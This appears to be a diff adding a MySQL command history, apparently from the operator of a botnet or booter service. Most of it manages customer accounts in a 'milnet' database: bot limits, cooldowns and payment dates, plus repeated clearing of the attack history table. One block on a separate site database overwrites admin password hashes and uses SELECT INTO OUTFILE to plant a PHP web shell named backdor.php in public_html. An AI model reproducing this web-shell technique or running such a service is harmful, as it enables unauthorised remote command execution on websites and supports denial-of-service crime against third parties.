+select * from history;
+select * from users;
+use milnet;
+select * from users;
+update users set cooldown = 800 where id = 57;
+update users set cooldown = 800 where id = 56;
+update users set cooldown = 800 where id = 67;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history;
+clear
+select * from history;
+select * from users;
+delete from users where id = 66;
+delete from users where id = 55;
+update users set cooldown = 10 where id = 73;
+select * from history;
+use milnet
+select * from users;
+update users set intvl = 30 where id =  25;
+use milnet
+select * from history;
+select * from users;
+update users set password = 13122004 where id = 76;
+select * from users;
+update users set username = SH4RK1337 where id = 76;
+update users set username = "SH4RK1337" where id = 76;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+update users set password = 1a2b3c4d where id = 75;
+update users set password = "1a2b3c4d" where id = 75;
+select * from users;
+select * from history;
+select * from users;
+exti;
+exit;
+select * from users;
+use milnet
+select * from users;
+update users set intvl = 30 where intvl = 40;
+select * from users;
+update users set intvl = 40 where id = 25;
+select * from users;
+]
+][
+]
+/exit;
+] ][ ] /exit;
+cd /var/www/html
+ls
+exit;
+cd /var/www/html ls exit;
+exit;
+use milnet
+select * from users;
+update users set password = "MONZA2.0" where id = 77;
+select * from users;
+update users set last_paid = 1583338945 where id = 25;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+update users set password = 1a2b3c4d where id = 76;
+update users set password = "1a2b3c4d" where id = 76;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+delete from users where id = 74;
+delete from users where id = 73;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+update users set cooldown = 800 where id = 78;
+update users set cooldown = 800 where id = 79;
+update users set cooldown = 800 where id = 80;
+update users set cooldown = 800 where id = 81;
+exit;
+use milnet
+select * from history;
+delete * from history;
+delete from history;
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from users;
+update users set max_bots = 3500 where id = 14;
+update users set last_paid = UNIX_TIMESTAMP() where id = 14;
+select * from users;
+exit;
+use milnet
+select * from users;
+update users set max_bots = 3500 where id = 61;
+update users set duration_limit = 1000 where id = 61;
+update users set cooldown = UNIX_TIMESTAMP() where id = 61;
+update users set cooldown = 30 where id = 61;
+update users set last_paid = UNIX_TIMESTAMP() where id = 61;
+select * from users;
+exit;
+use milnet
+select * from users;
+select * from history where id = 15,69,70,71;
+select * from history where id = 15, 69, 70, 71;
+select * from history where id in IN ('15,69,70,71');
+select * from history where id = 15;
+select * from history where id = 69;
+select * from history where id = 70;
+select * from history where id = 71;
+select * from history;
+select * from history where user-id = 71;
+select * from history where user_id = 71;
+select * from history where user_id = 15, 69, 70, 71;
+select * from history where user_id IN ('15,69,70,71');
+select * from history where user_id IN ('15, 69, 70, 71');
+select * from history where user_id IN '15, 69, 70, 71');
+select * from history where user_id IN '15, 69, 70, 71';
+select * from history where user_id IN 15, 69, 70, 71;
+select * from history where user_id = ('15,69,70,71');
+select * from history where user_id = 15
+;
+select * from history where user_id = 69;
+select * from users;
+select * from history where user_id = 15;
+select * from history where user_id = 60;
+select * from history where user_id = 69;
+select * from history where user_id = 70;
+select * from history where user_id = 71;
+select * from users;
+select * from history where user_id = 71;
+select * from users;
+select * from history;
+exit;
+use sinsempshw;
+select tables;
+show tables;
+select * from sh_user;
+! ls -l
+;
+update sh_users set senha = "cc7319c205f330c5452b5d2e695325fa" where id = 2;
+update sh_user set senha = "cc7319c205f330c5452b5d2e695325fa" where id = 2;
+update sh_user set senha = "cc7319c205f330c5452b5d2e695325fa" where id = 1;
+select * from sh_user;
+select * from sh_file;
+show ;
+select * from sh_menu_permissao;
+select * from sh_menu;
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/home/storage/4/ff/60/sinsempms/public_html/backdor.php"
+;
+use milnet
+select * from users;
+update users set last_paid = UNIX_TIMESTAMP() Where id = 45;
+exit;
+use guiadotrc6;
+show tables;
+select * from AdmSecoes;
+show tables;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from users;
+update users set last_paid = UNIX_TIMESTAMP() where id = 37;
+select * from users;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from users;
+DROP from users where id = 65;
+delete from users where id = 65;
+exit;
+use milnet
+select * form users;
+select * from users;
+select * from history;
+select * form users;
+select * from users;
+select * form users;
+select * from history;
+delete from history;
+exit;
+use milnet
+select * from users;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+select * from users;
+clear
+exit;
+use milnet
+select * from users;
+delete from users where id = 87;
+select * from users;
+exit;
+use milnet
+select * from users;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * history;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+update users set last_paid = UNIX_TIMESTAMP() where id = 77;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milenrt
+use milent
+use milnet
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from users;
+update users set last_paid = UNIX_TIMESTAMP() where id = 14;
+select * from users;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+show tables;
+cat whitelist
+;
+drop whitelist;
+drop table whitelist;
+exit;
+use milnet
+select * from history;
+select * from users;
+update users set last_paid = UNIX_TIMESTAMP() where id = 49;
+update users set max_bots = 1800 where id = 49;
+use milnet
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from h;
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from histor;
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+update users set last_paid = UNIX_TIMESTAMP() WHERE ID = 61;
+select * from users;
+exit;
+use milnet
+select * from users;
+ls
+;
+create table whitelist;
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+CREATE TABLE `whitelist` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `prefix` varchar(16) DEFAULT NULL,   `netmask` tinyint(3) unsigned DEFAULT NULL,   PRIMARY KEY (`id`),   KEY `prefix` (`prefix`) );
+exit;
+use milnet
+select * from history;
+select * from users;
+delete * from history;
+drop * from history;
+delete from history;
+exit;
+use milnet
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from users;
+set last_paid = UNIX_TIMESTAMP() where id = 89;
+update users set last_paid = UNIX_TIMESTAMP() where id = 89;
+select * from users;
+exti;
+ls
+exit;
+ls exit;
+exit;
+use milnet
+select * from users;
+update users set intvl = 36 where id = 36
+;
+update users set intvl = 36 where id = 39;
+update users set intvl = 36 where id = 40;
+update users set intvl = 36 where id = 41;
+update users set intvl = 36 where id = 56;
+update users set intvl = 36 where id = 57;
+update users set intvl = 36 where id = 67;
+update users set intvl = 36 where id = 78;
+update users set intvl = 36 where id = 79;
+update users set intvl = 36 where id = 80;
+update users set intvl = 36 where id = 81;
+use milnet
+select * from history;
+select * from users;
+update users set intvl = 37 where intvl = 36;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from user;
+select * from users;
+update users set last_paid = UNIX_TIMESTAMP() where intvl = 37;
+update users set intvl = 30 where intvl = 37;
+select * from users;
+exit;
+show databases;
+use milnet;
+show tables;
+select * from users;
